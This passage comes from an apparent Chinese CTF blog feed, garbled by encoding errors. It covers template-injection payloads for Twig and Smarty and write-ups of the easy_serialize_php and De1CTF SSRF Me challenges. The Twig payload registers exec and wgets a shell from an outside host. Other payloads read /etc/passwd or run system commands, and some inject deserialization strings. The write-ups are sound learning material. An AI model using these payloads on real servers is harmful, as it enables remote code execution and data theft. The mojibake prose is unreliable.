class="keyword">var</span>/www/html/shell.txt</span><br></pre></td></tr></table></figure><p> <img src="/2021/08/25/src/leak/1344396-20200818232520602-1757346385.png" alt="img"></p><p> æ¨¡æ¿æ³¨å…¥è¿œç¨‹ä¸‹è½½shellï¼Œå¹¶é‡å‘½åè¿è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;wget http://192.168.127.131/shell.txt </span></span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200818232914668-1182705687.png" alt="img"></p><h4 id="Smartyæ¨¡æ¿"><a href="#Smartyæ¨¡æ¿" class="headerlink" title="Smartyæ¨¡æ¿"></a>Smartyæ¨¡æ¿</h4><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p>CTFåœ°å€ï¼š<a href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challengesï¼ˆCISCN2019åä¸œå—èµ›åŒºWeb11ï¼‰</a></p><p>xffå¤´åšæ–‡ç« ï¼Œè¿›è¡Œæ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-Forï¼š&#123;sysytem(&#39;cat &#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æˆ‘æ²¡æœ‰å•ç‹¬å†™æ–‡ç« ï¼Œå› ä¸ºè§£é¢˜è¿‡ç¨‹å¾ˆå¿«ï¼ŒçŸ¥è¯†ç‚¹å¯¹åº”ä¸Šäº†ã€‚</p><p>smarty-sstiå¸¸è§„åˆ©ç”¨æ–¹å¼</p><p><strong>1. {$smarty.version}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #è·å–smartyçš„ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233050238-1942906786.png" alt="img"></p><p><strong>2. {php}{/php}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;  #æ‰§è¡Œç›¸åº”çš„phpä»£ç </span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233259128-196602210.png" alt="img"></p><p><strong>3. {literal}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;   </span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233719367-1535357026.png" alt="img"></p><p><strong>4.</strong> <strong>getstreamvariable</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820234305773-495371489.png" alt="img"></p><p><strong>5. {if}{/if}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820234610811-341143885.png" alt="img"></p><p>pythonä¸­çš„ssti</p><p>å¸¸è§æ¨¡æ¿æœ‰ï¼šjinja2ï¼Œ tornado</p><h4 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h4><p>ä»¥Djangoçš„æ¨¡æ¿ä¸ºæ¨¡å‹çš„</p><p>å®ƒæ˜¯flaskæ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼ŒJinja2ä¼šæŠŠæ¨¡æ¿å‚æ•°æä¾›çš„ç›¸åº”çš„å€¼æ›¿æ¢äº†  å—ã€‚</p><p>Jinja2ä½¿ç”¨ ç»“æ„è¡¨ç¤ºä¸€ä¸ªå˜é‡ï¼Œå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„å ä½ç¬¦ï¼Œå‘Šè¯‰æ¨¡ç‰ˆå¼•æ“è¿™ä¸ªä½ç½®çš„å€¼ä»æ¸²æŸ“æ¨¡ç‰ˆæ—¶ä½¿ç”¨çš„æ•°æ®ä¸­è·å–ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> src </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ´µæ¯ 2019 easy_serialize_php</title>
      <link href="/2021/08/19/buu/14/"/>
      <url>/2021/08/19/buu/14/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00çŸ¥è¯†ç‚¹"><a href="#0x00çŸ¥è¯†ç‚¹" class="headerlink" title="0x00çŸ¥è¯†ç‚¹"></a>0x00çŸ¥è¯†ç‚¹</h4><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12261610.html">å®‰æ´µæ¯ 2019]easy_serialize_php - ç‹å¹ä¹‹ - åšå®¢å›­ (cnblogs.com)</a></p><p>[<a href="https://www.cnblogs.com/h3zh1/p/12732336.html">å®‰æ´µæ¯ 2019]easy_serialize_php - h3zh1 - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.runoob.com/php/php-var_dump-function.html">https://www.runoob.com/php/php-var_dump-function.html</a></p><p><a href="https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp</a></p><h4 id="0x01è§£é¢˜"><a href="#0x01è§£é¢˜" class="headerlink" title="0x01è§£é¢˜"></a>0x01è§£é¢˜</h4><p><img src="/2021/08/19/buu/14/image-20210819094121329.png"></p><p>å‘ç°äº†å‚æ•°f</p><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function &#x3D; @$_GET[&#39;f&#39;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</span><br><span class="line">  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">  return preg_replace($filter,&#39;&#39;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">  unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;</span><br><span class="line">$_SESSION[&#39;function&#39;] &#x3D; $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#39;img_path&#39;])&#123;</span><br><span class="line">  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;</span><br><span class="line">  highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;</span><br><span class="line">  $userinfo &#x3D; unserialize($serialize_info);</span><br><span class="line">  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¼å®¡è®¡å‰ï¼Œæˆ‘æ³¨æ„åˆ°äº†é¢˜ç›®ä¸€ä¸ªå¾ˆå¤§çš„æç¤º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br></pre></td></tr></table></figure><p>é¡ºç€æç¤ºï¼Œèµ‹å€¼f=phpinfoè¿›è¡ŒæŸ¥è¯¢ã€‚</p><p><img src="/2021/08/19/buu/14/image-20210819094711265.png"></p><p>æ‰¾åˆ°äº†d0g3_f1ag.phpï¼ŒçŒœæµ‹flagåœ¨å…¶ä¸­</p><p>æ¥ä¸‹æ¥ä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure><p>filterå‡½æ•°æ˜¯ä¸ºäº†è¿‡æ»¤ç”¨çš„</p><p>è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œæ¯”å¦‚phpï¼Œflagï¼Œè‹¥é‡åˆ°ä¼šæ­£åˆ™æ›¿æ¢ä¸ºç©º</p><p>ä¹‹åè¿˜ä¼šåºåˆ—åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ååºåˆ—åŒ–æ“ä½œä¸€æ‰‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure><p>æˆ‘èŒå‘ç°unsetå‡½æ•°å°†$_SESSIONé”€æ¯äº†</p><p>ç„¶åé‡æ–°èµ‹äºˆ$_SESSIONäº†æ–°çš„å€¼ã€‚</p><p>æœ€åè°ƒç”¨äº†extract($_POST);</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</span><br></pre></td></tr></table></figure><h5 id="ä¸¾ä¾‹extract-å˜é‡è¦†ç›–"><a href="#ä¸¾ä¾‹extract-å˜é‡è¦†ç›–" class="headerlink" title="ä¸¾ä¾‹extract()å˜é‡è¦†ç›–"></a>ä¸¾ä¾‹extract()å˜é‡è¦†ç›–</h5><p>æ ¹æ®extract()æˆ‘ä»¬å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ï¼Œ</p><p>å½“æˆ‘ä»¬ä¼ å…¥SESSION[flag]=123æ—¶ï¼Œ$SESSION[â€œuserâ€]å’Œ$SESSION[â€˜functionâ€™] å…¨éƒ¨ä¼šæ¶ˆå¤±ã€‚</p><p>åªå‰©ä¸‹_SESSION[flag]=123ã€‚</p><p><img src="/2021/08/19/buu/14/1947190-20200419170914367-953947353.png" alt="img"></p><h6 id="é”®å€¼é€ƒé€¸"><a href="#é”®å€¼é€ƒé€¸" class="headerlink" title="é”®å€¼é€ƒé€¸"></a>é”®å€¼é€ƒé€¸</h6><p>åŸç†:å› ä¸ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ˜¯ä¸¥æ ¼çš„ï¼Œå¯¹åº”çš„æ ¼å¼ä¸èƒ½é”™ï¼Œæ¯”å¦‚s:4:â€nameâ€,é‚£s:4å°±å¿…é¡»æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²é•¿åº¦æ˜¯4çš„å¦åˆ™å°±å¾€åæˆªå–</p><p>å¹¶ä¸”unserializeä¼šæŠŠå¤šä½™çš„å­—ç¬¦ä¸²å½“åƒåœ¾å¤„ç†ï¼Œåœ¨èŠ±æ‹¬å·å†…çš„å°±æ˜¯æ­£ç¡®çš„ï¼ŒèŠ±æ‹¬å·åé¢çš„å°±éƒ½è¢«æ‰”æ‰ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#æ­£è§„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²</span></span><br><span class="line">$a = <span class="string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;&quot;</span>;</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line"><span class="comment">#å¸¦æœ‰å¤šä½™çš„å­—ç¬¦çš„å­—ç¬¦ä¸²</span></span><br><span class="line">$a_laji = <span class="string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;çœŸçš„åƒåœ¾img\&quot;;lajilaji&quot;</span>;</span><br><span class="line">var_dump(unserialize($a_laji));</span><br></pre></td></tr></table></figure><p>æœ‰äº†è¿™ä¸ªé€ƒé€¸æ¦‚å¿µçš„è¯ï¼Œå°±å¤§æ¦‚å¯ä»¥ç†è§£äº†ã€‚</p><p>å¦‚æœæˆ‘ä»¬æŠŠ$_SESSION[â€˜imgâ€™] = base64_encode(â€˜guest_img.pngâ€™);è¿™æ®µä»£ç çš„imgå±æ€§æ”¾åˆ°èŠ±æ‹¬å·å¤–è¾¹å»</p><p>ç„¶åèŠ±æ‹¬å·ä¸­æ³¨å¥½æ–°çš„imgå±æ€§ï¼Œé‚£ä¹ˆä»–æœ¬æ¥è¦æ±‚çš„imgå±æ€§å°±è¢«å’±ä»¬æ›¿æ¢äº†ã€‚</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]&#x3D;;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]&#x3D;;s:14:&quot;phpflagphpflag&quot;;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/buu/14/image-20210819210654326.png" alt="image-20210819210654326"></p><p><img src="/2021/08/19/buu/14/image-20210819210523566.png" alt="image-20210819210523566"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF 2019 SSRF Me</title>
      <link href="/2021/08/18/buu/13/"/>
      <url>/2021/08/18/buu/13/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h4 id="0x00çŸ¥è¯†ç‚¹"><a href="#0x00çŸ¥è¯†ç‚¹" class="headerlink" title="0x00çŸ¥è¯†ç‚¹"></a>0x00çŸ¥è¯†ç‚¹</h4><h4 id="0x01è§£é¢˜"><a href="#0x01è§£é¢˜" class="headerlink" title="0x01è§£é¢˜"></a>0x01è§£é¢˜</h4><p>é¶æœºå¼€å¯</p><p><img src="/2021/08/18/buu/13/image-20210818200351121.png" alt="image-20210818200351121"></p><p>æ˜æ˜¾çš„pythonä»£ç æ®µï¼Œå¤åˆ¶ä¸‹æ¥å¹¶è¿›è¡Œæ•´ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><span class="comment">#æ˜¯ä¸€ä¸ªç®€å•çš„èµ‹å€¼å‡½æ•°</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):<span class="comment">#å¦‚æœæ²¡æœ‰è¯¥æ–‡ä»¶å¤¹ï¼Œåˆ™åˆ›ç«‹ä¸€ä¸ªæ–‡ä»¶å¤¹</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   <span class="comment">#æ³¨æ„wï¼Œå¯ä»¥å¯¹result.txtæ–‡ä»¶è¿›è¡Œä¿®æ”¹</span></span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)<span class="comment">#è¿™ä¸ªå°†respä¸­çš„æ•°æ®å†™å…¥result.txtä¸­ï¼Œå¯ä»¥åˆ©ç”¨ä¸ºå°†flag.txtä¸­çš„æ•°æ®æ”¾è¿›result.txtä¸­</span></span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)<span class="comment">#æ‰“å¼€æ–¹å¼ä¸ºåªè¯»</span></span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()<span class="comment">#è¯»å–result.txtä¸­çš„æ•°æ®</span></span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="meta">        @app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])#æ³¨æ„è¿™ä¸ªç»‘å®šï¼Œæ¥ä¸‹æ¥çš„å‡ ä¸ªå‡½æ•°éƒ½å¾ˆé‡è¦ï¼Œè¿™ä¸ªç›¸å½“äºcè¯­è¨€é‡Œé¢çš„ä¸»å‡½æ•°ï¼Œæ¥ä¸‹æ¥æ˜¯è°ƒç”¨å…¶ä»–å‡½æ•°çš„è¿‡ç¨‹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))<span class="comment">#cookieä¼ é€’actionå‚æ•°ï¼Œå¯¹åº”ä¸åŒçš„å¤„ç†æ–¹å¼</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))<span class="comment">#ä¼ é€’getæ–¹å¼çš„å‚æ•°param</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))<span class="comment">#cookieä¼ é€’signå‚æ•°sign</span></span><br><span class="line">    ip = request.remote_addr<span class="comment">#è·å–è¯·æ±‚ç«¯çš„ipåœ°å€</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):<span class="comment">#è°ƒç”¨wafå‡½æ•°è¿›è¡Œè¿‡æ»¤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip) <span class="comment">#åˆ›å»ºTaskç±»å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())<span class="comment">#ä»¥jsonçš„å½¢å¼è¿”å›åˆ°å®¢æˆ·ç«¯</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]<span class="comment">#è¿™ä¸ªå¯ä»¥åˆ©ç”¨ä¸ºè®¿é—®flag.txtã€‚è¯»å–ç„¶åä¸ºä¸‹ä¸€æ­¥å°†flag.txtæ–‡ä»¶ä¸­çš„ä¸œè¥¿æ”¾åˆ°result.txtä¸­åšé“ºå«</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span><span class="comment">#getSignçš„ä½œç”¨æ˜¯æ‹¼æ¥secret_key,param,actionï¼Œç„¶åè¿”å›æ‹¼æ¥åçš„å­—ç¬¦ä¸²çš„md5åŠ å¯†å€¼</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span 